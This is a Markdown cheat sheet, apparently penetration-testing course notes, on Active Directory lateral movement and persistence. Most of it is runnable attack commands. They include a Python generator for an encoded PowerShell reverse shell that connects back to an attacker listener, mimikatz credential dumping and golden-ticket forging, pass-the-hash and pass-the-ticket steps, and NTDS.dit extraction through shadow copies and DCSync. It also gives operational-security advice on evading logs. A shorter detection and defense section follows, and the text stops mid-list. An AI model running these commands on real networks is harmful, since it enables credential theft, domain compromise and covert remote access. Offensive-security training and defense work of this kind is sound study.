# Active Directory Lateral Movement & Persistence - Cheat Sheet

## Table of Contents
1. [Lateral Movement Overview](#lateral-movement-overview)
2. [WMI and WinRM](#wmi-and-winrm)
3. [PsExec](#psexec)
4. [Pass the Hash (PtH)](#pass-the-hash-pth)
5. [Overpass the Hash](#overpass-the-hash)
6. [Pass the Ticket](#pass-the-ticket)
7. [DCOM](#dcom)
8. [Golden Ticket](#golden-ticket)
9. [Shadow Copies](#shadow-copies)

---

## Lateral Movement Overview

**Definition**: Techniques to gain further access within a target network using:
- Valid accounts
- Reused authentication material (hashes, tickets, tokens)

**Key Concept**: UAC remote restrictions don't apply to domain users, allowing full privileges during lateral movement.

**MITRE Framework**: Lateral Movement is a defined tactic with multiple sub-techniques.

---

## WMI and WinRM

### Windows Management Instrumentation (WMI)

**Characteristics:**
- Object-oriented task automation feature
- Uses RPC over port 135
- Session data on ports 19152-65535
- Requires local Administrator group membership
- Processes spawn in Session 0 (system services)

#### Method 1: Using WMIC (Deprecated)

```cmd
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```

**Parameters:**
- `/node:` - Target IP/hostname
- `/user:` - Username
- `/password:` - Password
- `process call create` - Command to execute

#### Method 2: PowerShell WMI

**Step 1: Create PSCredential Object**
```powershell
$username = 'jen'
$password = 'Nexus123!'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString
```

**Step 2: Create CIM Session**
```powershell
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
$command = 'calc'
```

**Step 3: Invoke WMI Method**
```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}
```

#### Reverse Shell via WMI

**Generate Base64 Payload (Python):**
```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

**Execute:**
```powershell
$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0...'
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}
```

### Windows Remote Management (WinRM)

**Characteristics:**
- Microsoft implementation of WS-Management protocol
- Port 5985 (HTTP) and 5986 (HTTPS)
- Requires Administrators or Remote Management Users group membership

#### Method 1: WinRS (Windows Remote Shell)

```cmd
winrs -r:files04 -u:jen -p:Nexus123! "cmd /c hostname & whoami"
```

**Reverse Shell:**
```cmd
winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0A..."
```

#### Method 2: PowerShell Remoting

```powershell
# Create credential object (same as WMI)
$username = 'jen'
$password = 'Nexus123!'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString

# Create PS Session
New-PSSession -ComputerName 192.168.50.73 -Credential $credential

# Enter interactive session
Enter-PSSession 1
```

---

## PsExec

**Source**: SysInternals Suite by Mark Russinovich

### Requirements
1. User in Administrators local group
2. ADMIN$ share available (default on Windows Server)
3. File and Printer Sharing enabled (default on Windows Server)

### How PsExec Works
1. Writes `psexesvc.exe` to `C:\Windows`
2. Creates and spawns service on remote host
3. Runs requested program as child process of `psexesvc.exe`

### Execution
We can run the 64-bit version of PsExec from C:\Tools\SysinternalsSuite.
```powershell
.\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
```

**Parameters:**
- `-i` - Interactive session
- `\\FILES04` - Target hostname
- `-u` - Domain\username
- `-p` - Password
- `cmd` - Command to execute

**Result**: Direct interactive shell on target system (no reverse shell needed)

---

## Pass the Hash (PtH)

### Theory
- Authenticate using NTLM hash instead of plaintext password
- Only works with NTLM authentication (not Kerberos)
- Uses SMB protocol for connection
- Requires local administrative permissions

### Prerequisites
1. SMB connection through firewall (port 445)
2. File and Printer Sharing enabled
3. ADMIN$ share available
4. Local administrative rights

### Important Limitation
- Works for domain accounts and built-in local Administrator
- Does NOT work for other local admin accounts (2014 security update)

### Tools
- Metasploit PsExec
- Passing-the-hash toolkit
- Impacket
- Built-in tools with hash support

### Execution (Impacket)

```bash
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```

**Format**: `-hashes LM:NTLM` or `-hashes :NTLM`

**Alternative Tools:**
```bash
# PSExec via Impacket
impacket-psexec -hashes :HASH Administrator@192.168.50.73

# SMBExec via Impacket
impacket-smbexec -hashes :HASH Administrator@192.168.50.73
```

---

## Overpass the Hash

### Theory
- Convert NTLM hash to Kerberos TGT
- Avoid NTLM authentication over network
- Use Kerberos for lateral movement
- Different from traditional Pass the Hash

### Attack Flow
1. Obtain cached NTLM hash (Mimikatz)
2. Create new process with hash (sekurlsa::pth)
3. Generate TGT via network authentication
4. Use Kerberos tickets for lateral movement

### Execution Steps

**Step 1: Dump Cached Credentials**
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

**Step 2: Create New Process with Hash**
```
mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

**Parameters:**
- `/user:` - Target username
- `/domain:` - Domain name
- `/ntlm:` - NTLM hash
- `/run:` - Process to create (usually PowerShell)

**Step 3: List Current Tickets (New PowerShell Window)**
```powershell
klist
```

**Step 4: Generate TGT**
```powershell
net use \\files04
```

**Step 5: Verify Kerberos Tickets**
```powershell
klist
```

**Step 6: Use PsExec with Kerberos**
```powershell
.\PsExec.exe \\files04 cmd
```

### Important Notes
- `whoami` shows original user (checks process token, not Kerberos tickets)
- Must use hostname (not IP) for Kerberos
- Any domain-permission command can generate TGT
- Operates in context of target user

---

## Pass the Ticket

### Theory
- Export and re-inject TGS (service tickets)
- More flexible than TGT (can be reused across systems)
- No administrative privileges required if tickets belong to current user
- Allows impersonation of other users

### Attack Scenario
- User A (jen) wants access to resource
- User B (dave) has access to resource
- Extract dave's TGS and inject into jen's session

### Execution Steps

**Step 1: Verify No Access**
```powershell
whoami
ls \\web04\backup
```

**Step 2: Export All Tickets**
```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

**Step 3: List Exported Tickets**
```powershell
dir *.kirbi
```

**Ticket Naming Convention:**
- `[LUID]-[Group]-[Flags]-[Username]@[Service]-[Domain].kirbi`
- Example: `[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi`

**Step 4: Inject Desired Ticket**
```
mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```

**Step 5: Verify Ticket Injection**
```powershell
klist
```

**Step 6: Access Resource**
```powershell
ls \\web04\backup
```

### Ticket Types
- **TGT**: `krbtgt@DOMAIN` - Can request any TGS
- **TGS**: `service/host@DOMAIN` - Access specific service only

---

## DCOM

### Distributed Component Object Model

**Characteristics:**
- Extension of COM for network communication
- Uses RPC on TCP port 135
- Requires local administrator access
- Very old technology (dating back to early Windows)

### MMC Application Technique

**Discovered by**: Matt Nelson  
**Documented by**: Cybereason

**Method**: Abuse MMC COM Application for remote code execution

### Execution

**Step 1: Instantiate Remote MMC Object**
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
```

**Step 2: Execute Command**
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

**ExecuteShellCommand Parameters:**
1. **Command** - Command to execute (e.g., "cmd", "powershell")
2. **Directory** - Working directory (use $null)
3. **Parameters** - Command arguments (e.g., "/c calc")
4. **WindowState** - Window display state (use "7")

**Step 3: Verify Execution**
```cmd
tasklist | findstr "calc"
```

### Reverse Shell via DCOM

```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0...","7")
```

---

## Golden Ticket

### Theory
- TGT encrypted with krbtgt account password hash
- Create custom TGT with any permissions
- Unlimited domain access
- Powerful persistence technique

### Advantages
- krbtgt password rarely changed
- Only changes during domain functional level upgrade (pre-2008)
- Very old hashes commonly found
- Can be created from non-domain-joined machine
- No administrative privileges required for creation

### Prerequisites
- Domain Admin access OR compromised DC
- krbtgt NTLM hash
- Domain SID

### Attack Steps

**Step 1: Obtain krbtgt Hash (On DC)**
```
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch
```

**Output includes:**
```
RID  : 000001f6 (502)
User : krbtgt
NTLM : 1693c6cefafffc7af11ef34d1c788f47
```

**Step 2: Get Domain SID**
```powershell
whoami /user
```

**Example output:**
```
User Name SID
========= =============================================
corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
```

**Domain SID**: `S-1-5-21-1987370270-658905905-1781884369` (remove RID)

**Step 3: Purge Existing Tickets (On Workstation)**
```
mimikatz # kerberos::purge
```

**Step 4: Create and Inject Golden Ticket**
```
mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```

**Parameters:**
- `/user:` - Username (must be existing account as of July 2022)
- `/domain:` - Domain name
- `/sid:` - Domain SID
- `/krbtgt:` - krbtgt NTLM hash
- `/ptt` - Pass the ticket (inject into memory)

**Default Values Set by Mimikatz:**
- User ID: 500 (Built-in Administrator RID)
- Groups: Domain Admins (512), Enterprise Admins (519), Schema Admins (518), etc.

**Step 5: Launch Command Prompt**
```
mimikatz # misc::cmd
```

**Step 6: Use PsExec for Lateral Movement**
```powershell
PsExec.exe \\dc1 cmd.exe
```

### Important Notes
- Must use **hostname** (not IP) to force Kerberos authentication
- Using IP forces NTLM authentication (will fail)
- Golden ticket provides domain-wide access
- Operates as overpass the hash with Kerberos

### Group Memberships Check
```cmd
whoami /groups
```

**Expected groups:**
- BUILTIN\Administrators
- CORP\Domain Admins
- CORP\Enterprise Admins
- CORP\Schema Admins
- CORP\Group Policy Creator Owners

---

## Shadow Copies

### Volume Shadow Service (VSS)

**Purpose**: Microsoft backup technology for file/volume snapshots

**Tool**: `vshadow.exe` (Windows SDK)

**Abuse Vector**: Extract NTDS.dit (Active Directory database) offline

### Requirements
- Domain Admin privileges
- Access to Domain Controller
- vshadow.exe utility

### Attack Steps

**Step 1: Create Shadow Copy**
```cmd
vshadow.exe -nw -p C:
```

**Parameters:**
- `-nw` - Disable writers (speeds up backup)
- `-p` - Store copy on disk
- `C:` - Volume to copy

**Output includes:**
```
Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

**Step 2: Copy NTDS.dit Database**
```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```

**Step 3: Save SYSTEM Hive**
```cmd
reg.exe save hklm\system c:\system.bak
```

**Step 4: Transfer Files to Kali**
- `ntds.dit.bak`
- `system.bak`

**Step 5: Extract Credentials (Kali)**
```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

**Output Format:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
```

**Format**: `username:rid:lm:ntlm:::`

### Alternative: DCSync (Stealthier)

**From Compromised Workstation:**
```
mimikatz # lsadump::dcsync /user:corp\Administrator
```

**Advantages:**
- No tools uploaded to DC
- Less access trail
- Uses legitimate AD replication
- More covert for red team ops

---

## Quick Reference Tables

### Lateral Movement Techniques Comparison

| Technique | Port(s) | Auth Type | Admin Required | Stealth | Tools |
|-----------|---------|-----------|----------------|---------|-------|
| **WMI** | 135, 19152-65535 | NTLM/Kerberos | Yes | Medium | wmic, PowerShell |
| **WinRM** | 5985, 5986 | NTLM/Kerberos | Yes | Medium | winrs, PowerShell |
| **PsExec** | 445 | NTLM/Kerberos | Yes | Low | PsExec64.exe |
| **Pass the Hash** | 445 | NTLM only | Yes | Medium | Impacket tools |
| **Overpass the Hash** | 88, 445 | Kerberos | Hash needed | Medium | Mimikatz, PsExec |
| **Pass the Ticket** | 88, 445 | Kerberos | No* | High | Mimikatz |
| **DCOM** | 135 | NTLM/Kerberos | Yes | Medium | PowerShell |

*No admin required if using current user's tickets

### Required Credentials by Technique

| Technique | Required Credential | Format | Notes |
|-----------|-------------------|--------|-------|
| WMI | Password or Hash | Cleartext or NTLM | Need admin group membership |
| WinRM | Password | Cleartext | Need Remote Management Users |
| PsExec | Password | Cleartext | Need admin group membership |
| Pass the Hash | Hash | NTLM | Only NTLM auth, local admin needed |
| Overpass the Hash | Hash | NTLM | Converts to Kerberos TGT |
| Pass the Ticket | Ticket | .kirbi file | No password/hash needed |
| DCOM | Password | Cleartext | Need admin group membership |

### Persistence Techniques Comparison

| Technique | Requirements | Stealth | Longevity | Detection Difficulty |
|-----------|--------------|---------|-----------|---------------------|
| **Golden Ticket** | krbtgt hash + Domain SID | High | Very Long (years) | Hard |
| **Shadow Copy** | Domain Admin on DC | Medium | Until hash change | Medium |
| **DCSync** | Domain Admin rights | High | Until hash change | Hard |

### Port Reference

| Port | Protocol | Service | Used By |
|------|----------|---------|---------|
| 88 | TCP/UDP | Kerberos | Overpass the Hash, Pass the Ticket, Golden Ticket |
| 135 | TCP | RPC | WMI, DCOM |
| 445 | TCP | SMB | PsExec, Pass the Hash |
| 5985 | TCP | WinRM HTTP | WinRM, PowerShell Remoting |
| 5986 | TCP | WinRM HTTPS | WinRM, PowerShell Remoting |
| 19152-65535 | TCP | RPC Dynamic | WMI (session data) |

---

## Command Cheat Sheet

### Mimikatz Common Commands

```
# Enable debug privileges
privilege::debug

# Dump credentials from LSASS
sekurlsa::logonpasswords

# Export tickets
sekurlsa::tickets /export

# List Kerberos tickets
sekurlsa::tickets

# Inject ticket
kerberos::ptt [ticket.kirbi]

# Create golden ticket
kerberos::golden /user:USERNAME /domain:DOMAIN /sid:SID /krbtgt:HASH /ptt

# Overpass the hash
sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH /run:powershell

# Purge tickets
kerberos::purge

# DCSync attack
lsadump::dcsync /user:DOMAIN\USERNAME

# Dump LSA secrets
lsadump::lsa /patch

# Launch command prompt
misc::cmd
```

### PowerShell Quick Commands

```powershell
# Create PSCredential
$secureString = ConvertTo-SecureString 'Password' -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential 'username', $secureString

# WMI Session
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $options
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "calc"}

# PowerShell Remoting
New-PSSession -ComputerName TARGET -Credential $credential
Enter-PSSession SESSION_ID

# DCOM
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","TARGET"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")

# List Kerberos tickets
klist

# Map network drive (generate TGT)
net use \\TARGET

# Get Domain SID
whoami /user

# Get group memberships
whoami /groups
```

### Impacket Tools

```bash
# WMI Execution
impacket-wmiexec -hashes :NTLM_HASH user@target
impacket-wmiexec DOMAIN/user:password@target

# PSExec
impacket-psexec -hashes :NTLM_HASH user@target
impacket-psexec DOMAIN/user:password@target

# SMBExec
impacket-smbexec -hashes :NTLM_HASH user@target

# Extract from NTDS
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL

# DCSync
impacket-secretsdump -just-dc-user USERNAME DOMAIN/user:password@DC_IP
```

### Windows Built-in Commands

```cmd
# WMIC
wmic /node:TARGET /user:USER /password:PASS process call create "COMMAND"

# WinRS
winrs -r:TARGET -u:USER -p:PASS "COMMAND"

# PsExec
PsExec64.exe -i \\TARGET -u DOMAIN\USER -p PASS cmd

# Shadow Copy
vshadow.exe -nw -p C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak

# Network authentication (generate TGT)
net use \\TARGET

# List running processes
tasklist
tasklist | findstr "PROCESS"

# Account policy
net accounts
```

---

## Attack Workflows

### Workflow 1: WMI Lateral Movement with Reverse Shell

```
1. Kali: Generate base64 payload
   python3 encode.py > payload.txt

2. Kali: Setup listener
   nc -lnvp 443

3. Windows: Create PSCredential
   $secureString = ConvertTo-SecureString 'Password' -AsPlaintext -Force
   $credential = New-Object System.Management.Automation.PSCredential 'user', $secureString

4. Windows: Create WMI session
   $options = New-CimSessionOption -Protocol DCOM
   $session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $options

5. Windows: Execute payload
   $Command = 'powershell -nop -w hidden -e BASE64_PAYLOAD'
   Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}

6. Kali: Receive shell
   whoami
   hostname
```

### Workflow 2: Overpass the Hash

```
1. Windows: Dump credentials
   mimikatz # privilege::debug
   mimikatz # sekurlsa::logonpasswords

2. Windows: Create new process with hash
   mimikatz # sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH /run:powershell

3. New PowerShell: Generate TGT
   net use \\TARGET

4. New PowerShell: Verify tickets
   klist

5. New PowerShell: Lateral movement
   .\PsExec.exe \\TARGET cmd
```

### Workflow 3: Pass the Ticket

```
1. Windows: Export tickets
   mimikatz # privilege::debug
   mimikatz # sekurlsa::tickets /export

2. Windows: List tickets
   dir *.kirbi

3. Windows: Inject desired ticket
   mimikatz # kerberos::ptt [TICKET_NAME].kirbi

4. Windows: Verify injection
   klist

5. Windows: Access resource
   ls \\TARGET\SHARE
```

### Workflow 4: Golden Ticket Persistence

```
1. DC: Extract krbtgt hash
   mimikatz # privilege::debug
   mimikatz # lsadump::lsa /patch

2. Workstation: Get Domain SID
   whoami /user

3. Workstation: Purge tickets
   mimikatz # kerberos::purge

4. Workstation: Create golden ticket
   mimikatz # kerberos::golden /user:USER /domain:DOMAIN /sid:SID /krbtgt:HASH /ptt

5. Workstation: Launch cmd
   mimikatz # misc::cmd

6. New cmd: Lateral movement
   PsExec.exe \\DC cmd.exe
```

### Workflow 5: Shadow Copy Credential Extraction

```
1. DC: Create shadow copy
   vshadow.exe -nw -p C:

2. DC: Copy NTDS.dit
   copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\windows\ntds\ntds.dit c:\ntds.dit.bak

3. DC: Save SYSTEM hive
   reg.exe save hklm\system c:\system.bak

4. DC: Transfer files to Kali
   (Use SMB, HTTP, or other method)

5. Kali: Extract credentials
   impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL

6. Kali: Crack hashes or use in PtH attacks
   hashcat -m 1000 hashes.txt wordlist.txt
```

---

## Detection and Defense

### Blue Team Indicators

**WMI/WinRM Abuse:**
- Unusual WMI process creation events (Event ID 4688)
- Remote WMI connections (Event ID 5857)
- WinRM service usage spikes
- PowerShell remote session creation

**PsExec:**
- PSEXESVC.exe in C:\Windows
- Service creation events (Event ID 7045)
- Named pipe creation
- ADMIN$ share access

**Pass the Hash:**
- NTLM authentication when Kerberos expected
- Authentication from unusual sources
- Multiple failed login attempts followed by success
- Lateral movement to multiple systems rapidly

**Kerberos Abuse:**
- TGT requests from unusual sources
- TGS requests for sensitive services
- Unusual service ticket lifetimes
- Ticket requests outside business hours

**Golden Ticket:**
- TGT with unusual lifetime (10 years)
- Kerberos tickets for disabled accounts
- Authentication from non-existent accounts
- Tickets with unusual encryption types

**Shadow Copies:**
- VSS activity on domain controllers
- NTDS.dit file access
- Unusual registry hive saves
- Large file transfers from DC

### Defensive Measures

**General:**
1. Enable LSA Protection
2. Use Credential Guard
3. Implement Protected Users group
4. Enable auditing (Kerberos, NTLM, account logon)
5. Monitor for anomalous lateral movement
6. Deploy EDR solutions
7. Implement network segmentation
8. Use LAPS for local admin passwords

**Specific to Golden Tickets:**
1. Change krbtgt password twice (double rotation)
2. Monitor for TGT anomalies
3. Reduce TGT lifetime
4. Implement smart card authentication

**Specific to Shadow Copies:**
1. Restrict VSS access
2. Monitor NTDS.dit access
3. Alert on registry hive exports
4. Use file integrity monitoring

---

## Common Errors and Solutions

| Error | Cause | Solution |
|-------|-------|----------|
| "Access Denied" | Insufficient privileges | Verify admin group membership |
| "Network path not found" | Firewall blocking | Check ports 135, 445, 5985 |
| "RPC server unavailable" | WMI/DCOM service stopped | Start Remote Registry service |
| Kerberos errors | Time sync issues | Sync time with DC: `net time \\dc1 /set /y` |
| "Computer account not found" | Hostname resolution | Use FQDN or check DNS |
| PsExec hangs | UAC restrictions | Use domain account, not local admin |
| Golden ticket fails | Using IP instead of hostname | Always use hostname for Kerberos |
| `whoami` shows wrong user | Normal behavior | Check with `klist` for tickets |

---

## Best Practices

### Operational Security

1. **Cleanup**: Remove uploaded tools after use
2. **Tickets**: Purge injected tickets when done
3. **Logs**: Be aware of logging enabled on targets
4. **Time**: Consider time zones and business hours
5. **Attribution**: Use existing user accounts when possible

### Technique Selection

**Choose WMI/WinRM when:**
- Need remote execution
- Have credentials
- Want stealthier option than PsExec

**Choose PsExec when:**
- Need interactive shell
- Have credentials
- Speed over stealth

**Choose Pass the Hash when:**
- Have hash but not password
- Target uses NTLM
- Operating from Linux

**Choose Overpass the Hash when:**
- Have hash but not password
- Need Kerberos authentication
-
